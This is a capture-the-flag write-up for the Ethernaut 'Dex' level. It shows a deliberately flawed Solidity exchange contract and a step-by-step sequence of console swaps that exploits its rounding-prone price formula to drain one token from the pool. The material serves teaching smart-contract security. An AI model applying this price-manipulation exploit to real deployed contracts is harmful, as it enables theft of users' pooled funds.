# 22. Dex

The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.

You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.

You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

## Target contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

contract Dex  {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor(address _token1, address _token2) public {
    token1 = _token1;
    token2 = _token2;
  }

  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swap_amount = get_swap_price(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swap_amount);
    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
  }

  function add_liquidity(address token_address, uint amount) public{
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function get_swap_price(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(spender, amount);
    SwappableToken(token2).approve(spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
}
```

## Vulnerability

The issue here lies in the way the swap price is computed. The total value of the pool is not constant and can therefore be taken advantage of.
Such issues are solved when using the `constant product marmet maker model` : `x * y = k` where `x` and `y` are the respective balances of tokenA and tokenB, `k` is the constant value of the pool.

Given the target contract's computation : `return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));` the pool value is not constant and can go to 0 due to rounding errors when computing the price, let's see how to exploit it:

We start with a balance of 10 in each token, while the contract hold initial balances of 100 of each token. The initial value of `k` would therefore be `10000`. The ratio of `token1 / token2` is initially 1.

To alleviate any approval issues later on let's approve more than required :

```js
// Run it in Ethernaut console
await contract.approve(contract.address, 1000);
```

Let's also hold some important variables in the console context :

```js
const accounts = await web3.eth.getAccounts();
const token1 = await contract.token1();
const token2 = await contract.token2();
```

Now let's swap our token1 balance (10) to token2 :

```js
await contract.swap(token1, token2, 10);
```

We should be left with 0 token 1 and 20 token2, while the pool now holds 110 token1 and 90 token2. Giving a `k` of `9900` and a ratio of `token1 / token2` of `1.22`.

```js
(await contract.balanceOf(token1, accounts[0])).toString();
// User balance of token 1 : '0'
(await contract.balanceOf(token2, accounts[0])).toString();
// User balance of token 2 : '20'
(await contract.balanceOf(token1, contract.address)).toString();
// Pool balance of token 1 : '110'
(await contract.balanceOf(token2, contract.address)).toString();
// Pool balance of token 2 : '90'
```

So let's swap again, this time from token2 to token 1  :

```js
await contract.swap(token2, token1, 20);
```

Which gives the following balances :

```js
(await contract.balanceOf(token1, accounts[0])).toString();
// User balance of token 1 : '24'
(await contract.balanceOf(token2, accounts[0])).toString();
// User balance of token 2 : '0'
(await contract.balanceOf(token1, contract.address)).toString();
// Pool balance of token 1 : '86'
(await contract.balanceOf(token2, contract.address)).toString();
// Pool balance of token 2 : '110'
```

Again, the pool now has a `k` value of : `9460` , we are effectively draining some value from it ! The ratio of `token1 / token2` is now of : `0.78`
Let's swap again from token 1 to token 2 :

```js
await contract.swap(token1, token2, 24);
```

With the following balances:

```js
(await contract.balanceOf(token1, accounts[0])).toString();
// User balance of token 1 : '0'
(await contract.balanceOf(token2, accounts[0])).toString();
// User balance of token 2 : '30'
(await contract.balanceOf(token1, contract.address)).toString();
// Pool balance of token 1 : '110'
(await contract.balanceOf(token2, contract.address)).toString();
// Pool balance of token 2 : '80'
```

The pool has a `k` value of `8800` and a ratio of `token1 / token2` of `1.37`.

Swapping one more time from token2 to token 1 :

```js
await contract.swap(token2, token1, 30);
```

We get :

```js
(await contract.balanceOf(token1, accounts[0])).toString();
// User balance of token 1 : '41'
(await contract.balanceOf(token2, accounts[0])).toString();
// User balance of token 2 : '0'
(await contract.balanceOf(token1, contract.address)).toString();
// Pool balance of token 1 : '69'
(await contract.balanceOf(token2, contract.address)).toString();
// Pool balance of token 2 : '110'
```

The pool has a `k` value of `7590` and a ratio of `token1 / token2` of `0.62`.

We can try swapping again from token1 to token2 :

```js
await contract.swap(token1, token2, 41);
```

```js
(await contract.balanceOf(token1, accounts[0])).toString();
// User balance of token 1 : '0'
(await contract.balanceOf(token2, accounts[0])).toString();
// User balance of token 2 : '65'
(await contract.balanceOf(token1, contract.address)).toString();
// Pool balance of token 1 : '110'
(await contract.balanceOf(token2, contract.address)).toString();
// Pool balance of token 2 : '45'
```

One last swap is necessary :

```js
await contract.swap(token2, token1, 65);
```

But this fails... because the computed swap price is : `((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)))` or : `65 * 110 / 45 = 158.8` but the pool has only 110 token 1... 

Let's compute the amount we need to send in order to get exactly 110 token1. The ratio `token1 / token2` is `2.44...` we just need to solve `110 = x * 2.44...` or `x = 110 / 2.44...` so, `x = 45.08`. Given that rounding down will be applied, we need to send `45` of token2 to drain all the available token1.


```js
await contract.swap(token2, token1, 45);
```

The final balances are the following :

```js
(await contract.balanceOf(token1, accounts[0])).toString();
// User balance of token 1 : '110'
(await contract.balanceOf(token2, accounts[0])).toString();
// User balance of token 2 : '20'
(await contract.balanceOf(token1, contract.address)).toString();
// Pool balance of token 1 : '0'
(await contract.balanceOf(token2, contract.address)).toString();
// Pool balance of token 2 : '90'
```

You can submit the challenge and move to the next one !